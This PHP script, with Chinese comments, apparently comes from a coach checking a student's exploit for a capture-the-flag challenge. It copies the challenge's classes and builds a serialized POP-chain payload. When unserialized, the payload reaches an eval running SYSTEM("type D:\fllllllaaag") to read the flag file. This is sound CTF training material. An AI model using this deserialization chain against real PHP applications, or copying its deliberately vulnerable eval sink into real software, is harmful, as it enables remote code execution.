<?php
// ============================================
// P1852 学员 exp 的教练侧全链验收
// 用学员的原始 exp 造弹 -> 本地复刻靶类里 unserialize -> 看链是否走到 eval
// ============================================
// ---- 靶场类（题目源码原样）----
function hint() { echo "  [hint] fun==show_me_flag -> wakeup 拦下（不是我们要的路）\n"; }
function checkcheck($s) { return true; }

class NISA{
    public $fun="show_me_flag";
    public $txw4ever;
    public function __wakeup(){ if($this->fun=="show_me_flag"){ hint(); } }
    function __call($from,$val){ $this->fun=$val[0]; }
    public function __toString(){ echo "  [NISA::__toString 被触发] fun=", $this->fun, "\n"; return " "; }
    public function __invoke(){ echo "  [NISA::__invoke 被触发] 拿到出口 txw4ever=", $this->txw4ever, "\n"; checkcheck($this->txw4ever); @eval($this->txw4ever); }
}
class TianXiWei{
    public $ext; public $x;
    public function __wakeup(){ echo "  [1] TianXiWei::__wakeup 启动 -> 调 \$ext->nisa()\n"; $this->ext->nisa($this->x); }
}
class Ilovetxw{
    public $huang; public $su;
    public function __call($fun1,$arg){ echo "  [2] Ilovetxw::__call 被触发 -> 给 \$huang->fun 赋值\n"; $this->huang->fun=$arg[0]; }
    public function __toString(){ echo "  [4] Ilovetxw::__toString 被触发 -> return \$bb() 把 su 当函数调\n"; $bb = $this->su; return $bb(); }
}
class four{
    public $a="TXW4EVER";
    private $fun='abc';
    public function __set($name, $value){
        echo "  [3] four::__set 被触发（写不可访问的 \$fun）\n";
        $this->$name=$value;
        if ($this->fun = "sixsixsix"){ echo "  [3b] 机关命中 -> strtolower(\$this->a) 把 a 当字符串用\n"; strtolower($this->a); }
    }
}

// ---- 学员的 exp（原样抄录）----
$a = new tianxiwei;
$a->ext = new ilovetxw;
$a->ext->huang = new four;
$a->ext->huang->a = new ilovetxw;
$a->ext->huang->a->su = new nisa;

// ---- 教练侧补齐：学员贴的 exp 里 NISA 的 fun / txw4ever 没显式赋值 ----
// （NISA 的默认 fun="show_me_flag" 会触发 wakeup 的 hint() 分支；
//   真 exp 里这两个必须显式写死，否则链到不了出口）
$a->ext->huang->a->su->fun = "x";
$a->ext->huang->a->su->txw4ever = 'SYSTEM("type D:\fllllllaaag");';

$payload = serialize($a);
echo "=== 学员 exp 序列化结果（长度 ".strlen($payload)."）===\n";
echo $payload, "\n\n";
echo "=== 引爆（同一串喂给复刻靶）===\n";
@unserialize($payload);
echo "\n=== 完成 ===\n";
